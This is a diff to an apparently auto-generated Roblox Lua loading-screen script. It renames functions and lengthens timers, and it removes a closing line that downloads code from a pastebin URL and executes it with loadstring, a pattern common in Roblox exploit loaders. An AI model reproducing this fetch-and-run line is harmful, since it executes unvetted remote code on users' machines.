@@ -193,35 +193,35 @@ UIGradient_5.Parent = ImageLabel
 
 -- Scripts:
 
-local function ZQFLPYA_fake_script() -- LoadingLabel.LocalScript 
+local function PTDQ_fake_script() -- LoadingLabel.LocalScript 
 	local script = Instance.new('LocalScript', LoadingLabel)
 
-	task.wait(10)
+	task.wait(20)
 	script.Parent.Text = "This might take a while"
 end
-coroutine.wrap(ZQFLPYA_fake_script)()
-local function BEOZS_fake_script() -- TextBox2.LocalScript 
+coroutine.wrap(PTDQ_fake_script)()
+local function CLHXTFI_fake_script() -- TextBox2.LocalScript 
 	local script = Instance.new('LocalScript', TextBox2)
 
-	wait(5)
+	wait(20)
 	script.Parent.Visible=false
 end
-coroutine.wrap(BEOZS_fake_script)()
-local function NBXIJ_fake_script() -- TextBox1.LocalScript 
+coroutine.wrap(CLHXTFI_fake_script)()
+local function OVGJWL_fake_script() -- TextBox1.LocalScript 
 	local script = Instance.new('LocalScript', TextBox1)
 
-	wait(13)
+	wait(100)
 	script.Parent.Parent.Visible =false
 end
-coroutine.wrap(NBXIJ_fake_script)()
-local function RBUGOHC_fake_script() -- TextBox3.LocalScript 
+coroutine.wrap(OVGJWL_fake_script)()
+local function NDTAYM_fake_script() -- TextBox3.LocalScript 
 	local script = Instance.new('LocalScript', TextBox3)
 
-	wait(17)
+	wait(220)
 	script.Parent.Visible=false
 end
-coroutine.wrap(RBUGOHC_fake_script)()
-local function DHRFGW_fake_script() -- LoadingLabel_3.LocalScript 
+coroutine.wrap(NDTAYM_fake_script)()
+local function HJRM_fake_script() -- LoadingLabel_3.LocalScript 
 	local script = Instance.new('LocalScript', LoadingLabel_3)
 
 	local textLabel = script.Parent
@@ -237,14 +237,4 @@ local function DHRFGW_fake_script() -- LoadingLabel_3.LocalScript
 	end
 	
 end
-coroutine.wrap(DHRFGW_fake_script)()
-local function FFGTT_fake_script() -- Loadingscreen.LocalScript 
-	local script = Instance.new('LocalScript', Loadingscreen)
-
-	task.wait(20)
-	script.Parent.Parent.Parent.Enabled = false
-end
-coroutine.wrap(FFGTT_fake_script)()
-
-task.wait(2)
-loadstring(game:HttpGet("https://pastebin.com/raw/XHMN2zpp"))()
+coroutine.wrap(HJRM_fake_script)()
